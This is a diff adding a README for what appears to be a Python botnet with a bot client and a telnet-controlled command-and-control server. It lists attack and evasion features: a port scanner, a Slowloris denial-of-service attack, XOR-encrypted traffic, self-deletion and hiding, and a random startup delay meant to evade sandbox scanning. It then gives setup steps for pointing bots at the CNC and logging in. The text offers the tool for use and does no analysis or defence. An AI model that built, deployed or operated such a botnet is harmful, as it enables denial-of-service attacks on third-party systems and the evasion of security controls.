@@ -1,0 +1,53 @@
+News&Features
+    BOT(V2):
+
+         Added Port Scanner
+         Improved Code
+         Added Slowloris attack
+         Improved attack process
+         Auto enable ssl when attack
+         Encrypted traffic(xor)
+         Deamon(only linux)(PS: You can use pyinstaller option '--noconsole' on windows)
+         Hide itself(linux: Deamon + delete itself | windows: Hide sys.argv[0])
+         Added single instance mode
+         Startup delay 30~90(random) seconds to bypass some sandbox scanning
+
+
+    CNC(V2):
+
+         Decrease delay of send command
+         Support Telnet Login
+         Encrypted traffic(xor)
+         Coloured CNC
+         Using login.txt to check account.(Need improve, sometime may have bugs)
+         Keep-alive connection
+         Using telnet to connect
+         Using 'ping/pong' to check bot connection status(use 'scan' to check it by yourself or it checks every 15 seconds.)
+
+Opinion:
+    In my opinion, best way is using python v3.4.3 and pyinstaller v3.2. They are the best pattern i tested and used.
+
+Usage:
+    Change the cnc server ip and port into the client.py at first.
+
+Then, edit the password of cnc.py and run the cnc.py:
+
+python3 cnc.py <port>
+At Last, run the bot.py in any python3 environment(IDE, codeanywhere,etc.) or u can use pyinstaller to help u
+
+then the Bot is online.
+
+To login cnc, using telnet(Updated after v2) connect it then
+
+It should be show like this:
+
+    Username:
+At this moment, u should create a file called login.txt and input the username and password in it
+
+Like this:
+
+    error1 test
+After that, Just input ur username and password.
+
+        Username:error123
+        Password:test
